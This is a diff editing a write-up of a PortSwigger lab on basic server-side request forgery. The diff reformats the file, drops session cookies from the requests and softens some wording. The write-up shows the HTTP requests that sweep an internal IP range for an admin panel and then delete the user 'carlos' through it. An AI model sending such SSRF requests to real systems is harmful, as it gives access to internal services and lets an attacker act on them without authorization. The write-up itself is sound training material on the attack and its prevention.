@@ -1,13 +1,13 @@
 # PortSwigger Lab: Basic SSRF against another back-end system
 
-# TAGS: SSRF, Server-Side Request Forgery, Burp Intruder
+**TAGS:** SSRF, Server-Side Request Forgery, Burp Intruder
 
-Category: SSRF
-Date: November 4, 2026
-Day: Wednesday
-Link: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-other-backend-system
-Published: Ready
-Status: Done
+**Category:** SSRF  
+**Date:** November 4, 2026  
+**Day:** Wednesday  
+**Link:** https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-other-backend-system  
+**Published:** Ready  
+**Status:** Done
 
 ---
 
@@ -30,7 +30,6 @@ I opened a product page and clicked "Check stock". The request was:
 ```http
 POST /product/stock HTTP/2
 Host: 0a4e00790427b67d825edd1300480061.web-security-academy.net
-Cookie: session=EqG4iKHrWSx1qXAgVNvsuKHP6HMenTq2
 Content-Type: application/x-www-form-urlencoded
 
 stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=2
@@ -49,7 +48,6 @@ I sent the stock request to Burp Intruder and marked the last octet as the paylo
 ```http
 POST /product/stock HTTP/2
 Host: 0a4e00790427b67d825edd1300480061.web-security-academy.net
-Cookie: session=EqG4iKHrWSx1qXAgVNvsuKHP6HMenTq2
 Content-Type: application/x-www-form-urlencoded
 
 stockApi=http://192.168.0.§X§:8080/admin
@@ -70,25 +68,24 @@ I copied that request into Repeater and changed the URL to the delete endpoint:
 ```http
 POST /product/stock HTTP/2
 Host: 0a4e00790427b67d825edd1300480061.web-security-academy.net
-Cookie: session=EqG4iKHrWSx1qXAgVNvsuKHP6HMenTq2
 Content-Type: application/x-www-form-urlencoded
 
 stockApi=http://192.168.0.184:8080/admin/delete?username=carlos
 ```
 
-The server fetched that URL from inside the network, which counted as an admin request. The user `carlos` was deleted and the lab was solved.
+The server fetched the URL from inside the network, allowing the request to reach an admin endpoint that trusts internal connections. The user `carlos` was deleted and the lab was solved.
 
 ---
 
 ## Root Cause
 
-The `stockApi` parameter is a URL that the server fetches without checking the destination. The stock system trusts requests that come from inside its own network, so the SSRF lets me reach the admin panel on `192.168.0.184` and even perform actions there.
+The `stockApi` parameter is a URL that the server fetches without checking the destination. The admin interface trusts requests that come from inside the network, so the SSRF lets me reach the admin panel on `192.168.0.184` and even perform actions there.
 
 ---
 
 ## Impact
 
-An attacker can map the internal network and reach services that are not exposed to the internet. In this lab that meant finding the admin panel and deleting a user. In a real application the same technique can find databases, monitoring tools, cloud metadata and other internal systems, then read or modify data on them.
+An attacker can map the internal network and reach services that are not exposed to the internet. In this lab that meant finding the admin panel and deleting a user. In a real application the same technique can find databases, monitoring tools, cloud metadata and other internal systems, then potentially read or modify data on them.
 
 ---
 
@@ -105,18 +102,18 @@ To prevent this issue, applications should:
 
 ## Key Takeaways
 
-1. Internal services often trust requests that come from inside the network.
-2. Intruder makes it easy to sweep an internal range and spot the one machine that answers.
-3. A `200` among many errors is the signal that you found the target.
+1. Internal services may trust requests that come from inside the network.
+2. Intruder makes it easy to sweep an internal range and identify machines that respond.
+3. A `200` among many errors can be a useful signal, but the response content is needed to confirm that the target was found.
 4. The same SSRF that reads an internal page can also perform actions on it.
 
 ---
 
 ## References
 
-- [PortSwigger — Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
-- [PortSwigger — Basic SSRF against another back-end system (lab)](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-other-backend-system)
-- [OWASP — Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
+- PortSwigger — Server-side request forgery (SSRF): https://portswigger.net/web-security/ssrf
+- PortSwigger — Basic SSRF against another back-end system (lab): https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-other-backend-system
+- OWASP — Server-Side Request Forgery: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
 
 ---
 
